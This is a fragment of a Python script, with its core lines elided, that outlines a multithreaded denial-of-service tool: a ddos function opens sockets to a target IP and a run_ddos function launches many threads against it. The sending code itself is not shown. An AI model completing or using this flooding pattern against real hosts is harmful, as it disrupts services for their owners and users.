...
def ddos(target_ip, thread_id):
    ...
    try:
        ...
        print(f"[Thread {thread_id}] Request sent to {target_ip}")
        
        sock.close()
    except socket.error as e:
        print(f"[Thread {thread_id}] Error: {e}")

def run_ddos(target, num_threads):
    """
    Launch multiple threads to simulate concurrent requests.
    """
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=ddos, args=(target, i+1))
